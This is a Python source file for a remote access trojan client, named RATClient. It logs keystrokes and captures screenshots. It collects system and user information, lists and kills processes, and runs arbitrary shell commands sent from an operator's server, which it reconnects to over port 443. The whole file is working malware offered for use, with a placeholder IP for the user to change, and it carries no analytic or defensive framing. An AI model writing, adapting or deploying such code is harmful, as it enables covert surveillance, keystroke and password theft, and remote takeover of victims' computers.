import os
import time
import socket
import struct
import threading
import platform
import subprocess
import io
import psutil
import ctypes
from pynput import keyboard
from PIL import ImageGrab

SERVER_IP = "192.168.0.0"  # change your ip 
SERVER_PORT = 443

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f"[{key}]"

    def get_logs(self):
        logs = self.log
        self.log = ""
        return logs.encode()

class PlainConnection:
    def __init__(self):
        self.socket = None

    def connect(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((SERVER_IP, SERVER_PORT))
                return
            except:
                time.sleep(5)

    def send(self, data: bytes):
        length = struct.pack("!I", len(data))
        self.socket.sendall(length + data)

    def receive(self):
        try:
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            length = struct.unpack("!I", length_data)[0]
            data = b""
            while len(data) < length:
                packet = self.socket.recv(length - len(data))
                if not packet:
                    return None
                data += packet
            return data
        except:
            return None

class RATClient:
    def __init__(self):
        self.keylogger = KeyLogger()
        self.conn = PlainConnection()

    def capture_screenshot(self):
        buffer = io.BytesIO()
        try:
            img = ImageGrab.grab()
            img.save(buffer, format="PNG")
            return b"TYPE:SCREENSHOT" + buffer.getvalue()
        except Exception as e:
            return b"TYPE:TEXT" + f"[ERROR screenshot] {e}".encode()

    def system_info(self):
        info = {
            "OS": platform.platform(),
            "CPU": platform.processor(),
            "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            "User": os.getlogin()
        }
        return b"TYPE:TEXT" + str(info).encode()

    def list_processes(self):
        try:
            result = "\n".join(f"{p.pid} - {p.name()}" for p in psutil.process_iter())
            return b"TYPE:TEXT" + result.encode()
        except:
            return b"TYPE:TEXT" + b"[ERROR listing processes]"

    def kill_process(self, pid):
        try:
            p = psutil.Process(int(pid))
            p.terminate()
            return b"TYPE:TEXT" + b"[+] Process terminated"
        except:
            return b"TYPE:TEXT" + b"[-] Failed to terminate"

    def execute_shell(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return b"TYPE:TEXT" + output
        except subprocess.CalledProcessError as e:
            return b"TYPE:TEXT" + e.output

    def run(self):
        self.conn.connect()
        while True:
            cmd = self.conn.receive()
            if not cmd:
                break

            try:
                decoded = cmd.decode()
                if decoded == "help":
                    response = "Commands: help, get_logs, screenshot, shell <cmd>, system_info, list_processes, kill_process <pid>"
                    self.conn.send(b"TYPE:TEXT" + response.encode())
                elif decoded == "get_logs":
                    self.conn.send(b"TYPE:TEXT" + self.keylogger.get_logs())
                elif decoded == "screenshot":
                    self.conn.send(self.capture_screenshot())
                elif decoded == "system_info":
                    self.conn.send(self.system_info())
                elif decoded == "list_processes":
                    self.conn.send(self.list_processes())
                elif decoded.startswith("kill_process "):
                    pid = decoded.split(" ", 1)[1]
                    self.conn.send(self.kill_process(pid))
                elif decoded.startswith("shell "):
                    cmdline = decoded[6:]
                    self.conn.send(self.execute_shell(cmdline))
                else:
                    self.conn.send(b"TYPE:TEXT" + b"Unknown command")
            except Exception as e:
                self.conn.send(b"TYPE:TEXT" + f"[Error] {e}".encode())

if __name__ == "__main__":
    RATClient().run()
